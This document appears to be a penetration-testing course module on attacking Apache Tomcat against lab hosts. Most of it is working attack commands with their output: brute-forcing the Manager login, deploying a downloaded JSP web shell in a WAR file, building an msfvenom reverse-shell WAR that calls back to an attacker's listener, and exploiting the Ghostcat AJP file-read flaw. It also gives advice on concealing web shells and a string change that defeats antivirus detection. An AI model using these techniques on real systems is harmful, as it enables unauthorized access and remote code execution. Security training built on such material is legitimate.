# Attacking Tomcat
Gaining access to the Tomcat Manager panel is the primary objective when attacking a Tomcat instance. With manager access, uploading a malicious WAR file converts that access directly into remote code execution. Tomcat also has a history of protocol-level vulnerabilities, the most notable being Ghostcat, which does not require authentication at all.

***
## Manager Login Brute Force
### Metasploit Module
The [tomcat_mgr_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/) auxiliary module handles the brute force and comes pre-loaded with Tomcat-specific wordlists. Always set `STOP_ON_SUCCESS` to avoid unnecessary noise after a valid pair is found:

```bash
msf6 > use auxiliary/scanner/http/tomcat_mgr_login

msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
```

```
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:tomcat (Incorrect)
[+] 10.129.201.58:8180 - Login Successful: tomcat:admin
```

The module encodes credentials in base64 for HTTP Basic Auth, matching exactly how Tomcat's login page handles authentication. You can verify what the scanner is sending at any point by decoding the `Authorization` header:

```bash
echo YWRtaW46dmFncmFudA== | base64 -d
admin:vagrant
```

To debug the module, proxy its traffic through Burp Suite:

```bash
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set PROXIES HTTP:127.0.0.1:8080
```

This pipes all requests through Burp so you can inspect headers, responses, and confirm the module is behaving correctly.
### Python Script Alternative
The [Tomcat-Manager-Bruteforce](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce) Python script provides the same functionality without Metasploit and can be pointed at the same wordlists:

```bash
python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager \
  -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt \
  -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

```
[+] Success!!
[+] Username : b'tomcat'
[+] Password : b'admin'
```

***
## WAR File Upload for RCE
With valid `manager-gui` credentials, the Tomcat Manager at `/manager/html` allows uploading a WAR (Web Application Archive) file to deploy a new application. This is the standard path to code execution.
### Method 1: JSP Web Shell in a WAR
Download a JSP web shell and package it into a WAR archive using `zip`:

```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
```

In the Manager GUI, scroll to the Deploy section, click Browse, select `backup.war`, and click Deploy. The application is then accessible under the `/backup` path. Trigger the shell:

```bash
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```

```
Command: id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

To clean up, click Undeploy next to the backup entry in the Manager. This removes the WAR archive and the deployed directory from the webapps folder. Log the full path (`/opt/tomcat/apache-tomcat-10.0.10/webapps`) in the report appendix.
### Method 2: Msfvenom Reverse Shell WAR
For a direct reverse shell instead of a web shell, generate a WAR payload with `msfvenom`:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```

Set up a listener and deploy the WAR file through the Manager GUI as before:

```bash
nc -lnvp 4443
```

Clicking on the deployed `/backup` application triggers the reverse shell connection:

```
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 45224

uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

The [multi/http/tomcat_mgr_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/) Metasploit module automates this entire process if you prefer a single command approach.
### Web Shell Operational Notes
Good practice when deploying web shells during assessments:

- Use a non-obvious file name such as an MD5 hash rather than `shell.jsp` or `cmd.jsp`
- Use a hashed GET parameter rather than `cmd` to avoid easy discovery by third parties
- Restrict access to your source IP if the server environment allows it
- Remove the shell immediately after use and document the file path, hash, and location in the report

The lightweight [cmd.jsp](https://github.com/SecurityRiskAdvisors/cmd.jsp) shell by Security Risk Advisors is under 1KB and uses a browser bookmarklet for its interface. A minor string change such as altering `"Uploaded:` to `"uPlOaDeD:` in the source brings AV detection from 2/58 to 0/58 vendors at the time of the module writing. 

***
## CVE-2020-1938: Ghostcat
[Ghostcat](https://nvd.nist.gov/vuln/detail/CVE-2020-1938) is an unauthenticated Local File Inclusion vulnerability affecting all Tomcat versions before 9.0.31, 8.5.51, and 7.0.100.  It exploits a flaw in the Apache JServ Protocol (AJP) connector, which listens by default on port 8009 and is enabled and bound to all interfaces out of the box. Because AJP treats incoming connections as trusted proxy traffic, an attacker who can reach port 8009 directly can read arbitrary files from within the web application directory. 

Confirm both ports are open with Nmap:

```bash
nmap -sV -p 8009,8080 app-dev.inlanefreight.local
```

```
PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30
```

Use the [CNVD-2020-10487 PoC](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi) to read files within the webapps directory. Files outside of webapps such as `/etc/passwd` are not reachable:

```bash
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
```

```
Getting resource at ajp13://app-dev.inlanefreight.local:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
...
<display-name>Welcome to Tomcat</display-name>
```

The `WEB-INF/web.xml` deployment descriptor is the primary file of interest since it maps URL routes to servlet classes and can contain database connection strings or references to other sensitive configuration files. If the application also allows file uploads, Ghostcat can escalate from file read to full RCE by uploading a JSP file and then using the AJP connector to execute it as a JSP. 

> Tomcat frequently runs as SYSTEM on Windows or root on Linux, especially on older internal deployments. A foothold on a Tomcat server in an Active Directory environment is a high-value outcome worth significant post-exploitation effort.
